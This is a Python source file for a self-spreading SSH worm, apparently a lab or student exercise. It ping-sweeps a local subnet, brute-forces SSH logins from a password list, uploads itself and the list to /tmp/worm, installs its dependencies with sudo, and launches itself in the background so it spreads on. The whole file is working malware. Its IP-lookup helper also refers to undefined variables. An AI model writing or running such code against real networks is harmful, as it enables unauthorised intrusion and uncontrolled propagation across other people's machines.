import subprocess 
import time
import logging
import paramiko
import sys
import os
import netifaces


def get_list_of_hosts():
	hostlist = []
	my_IP_address = get_current_IP_address('en0')
	FNULL = open(os.devnull, 'w')

	
	for ping in range(1,10): 
	    address = "192.168.2." + str(ping) 

	
	    if(address != my_IP_address):
	    	
	    	res = subprocess.call(['ping', '-c', '3', address],stdout=FNULL, stderr=subprocess.STDOUT) 
	    	if res == 0: 
	    		hostlist.append(address)
	return hostlist


def Attack_SSH(ipAddress) :
	logging.info("Attacking Host : %s " %ipAddress)
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	for line in open("./passwords.txt", "r").readlines() :
		[username, password] = line.strip().split()

		try :
			logging.info("Trying with username: %s password: %s " % (username, password))
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh.connect(ipAddress, username=username, password=password)

		except paramiko.AuthenticationException:
			logging.info("Failed...")
			continue 
		
		logging.info("Success ... username: %s and passoword %s is VALID! " % (username, password))
		UploadFileAndExecute(ssh)
		break


def UploadFileAndExecute(sshConnection) :
	print("Upload files to connection...")
	sftpClient = sshConnection.open_sftp()


	stdin, stdout, stderr = sshConnection.exec_command("mkdir /tmp/worm") 
	stdout.channel.recv_exit_status()   
	logging.info("Created folder /tmp/worm")
   

	sftpClient.put("./replicator.py", "/tmp/worm/" + "./replicator.py")
	logging.info("Added replicator.py")


	sftpClient.put("./passwords.txt", "/tmp/worm/" +"./passwords.txt")
	logging.info("Added passwords.txt")


	logging.info("Installing python3-pip")
	stdin, stdout, stderr = sshConnection.exec_command("sudo apt -y install python3-pip")  
	stdout.channel.recv_exit_status() 
	logging.info("Finished installing python3-pip")


	logging.info("Installing paramiko")
	stdin, stdout, stderr = sshConnection.exec_command("sudo apt-get -y install python-paramiko")  
	stdout.channel.recv_exit_status()   
	logging.info("Finished installing paramiko")


	logging.info("Installing netifaces")
	stdin, stdout, stderr = sshConnection.exec_command("sudo apt-get -y install python-netifaces")  
	stdout.channel.recv_exit_status()   
	logging.info("Finished installing netifaces")


	stdin, stdout, stderr = sshConnection.exec_command("chmod a+x /tmp/worm/" +"replicator.py")  
	stdout.channel.recv_exit_status()   


	stdin, stdout, stderr = sshConnection.exec_command("nohup python /tmp/worm/" +"replicator.py passwords.txt"+ " &")  
	stdout.channel.recv_exit_status()   


def get_current_IP_address(interface):
      
        network_interfaces = netifaces.interfaces()
        ip_Address = None

        for netFace in networkInterfaces:

          
            try:
                addr = netifaces.ifaddresses(netFace)[2][0]['addr']
            except:
                continue

            if not addr == "127.0.0.1":
                ip_Address = addr
        return ipAddr


if __name__ == "__main__" :
	logging.basicConfig(filename='worm.log',level=logging.DEBUG)
	logging.getLogger("paramiko").setLevel(logging.WARNING)
	logging.info('Staring worm...')

	hostlist = get_list_of_hosts()
	list_string = str(hostlist)
	logging.info("Available hosts are: " + list_string)

	for host in hostlist:
		Attack_SSH(host)
	logging.info("Done")
